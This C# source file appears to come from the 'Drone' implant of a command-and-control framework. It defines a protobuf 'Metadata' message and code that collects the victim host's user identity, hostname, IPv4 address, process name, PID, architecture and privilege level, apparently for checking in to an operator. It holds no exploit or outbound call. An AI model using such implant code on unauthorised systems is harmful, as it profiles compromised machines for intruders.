using System;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Security.Principal;
using System.Threading.Tasks;

using Drone.Utilities;

using ProtoBuf;

namespace Drone.Messages;

[ProtoContract]
public sealed class Metadata
{
    [ProtoMember(1)]
    public string Id { get; set; }
    
    [ProtoMember(2)]
    public string Identity { get; set; }
    
    [ProtoMember(3)]
    public byte[] Address { get; set; }
    
    [ProtoMember(4)]
    public string Hostname { get; set; }

    [ProtoMember(5)]
    public string Process { get; set; }
    
    [ProtoMember(6)]
    public int Pid { get; set; }
    
    [ProtoMember(7)]
    public bool Is64Bit { get; set; }
    
    [ProtoMember(8)]
    public IntegrityLevel Integrity { get; set; }

    public static async Task<Metadata> Generate()
    {
        using var identity = WindowsIdentity.GetCurrent();
        using var process = System.Diagnostics.Process.GetCurrentProcess();

        var hostname = Dns.GetHostName();
        var addresses = await Dns.GetHostAddressesAsync(hostname);

        var metadata = new Metadata
        {
            Id = Helpers.GenerateShortGuid(),
            Identity = identity.Name,
            Address = addresses.First(a => a.AddressFamily == AddressFamily.InterNetwork).GetAddressBytes(),
            Hostname = hostname,
            Process = process.ProcessName,
            Pid = process.Id,
            Is64Bit = Environment.Is64BitProcess,
        };

        if (identity.Name.Equals("SYSTEM", StringComparison.OrdinalIgnoreCase))
        {
            metadata.Integrity = IntegrityLevel.SYSTEM;
        }
        else
        {
            var principal = new WindowsPrincipal(identity);

            metadata.Integrity = principal.IsInRole(WindowsBuiltInRole.Administrator)
                ? IntegrityLevel.HIGH
                : IntegrityLevel.MEDIUM;
        }

        return metadata;
    }
}

public enum IntegrityLevel
{
    MEDIUM,
    HIGH,
    SYSTEM
}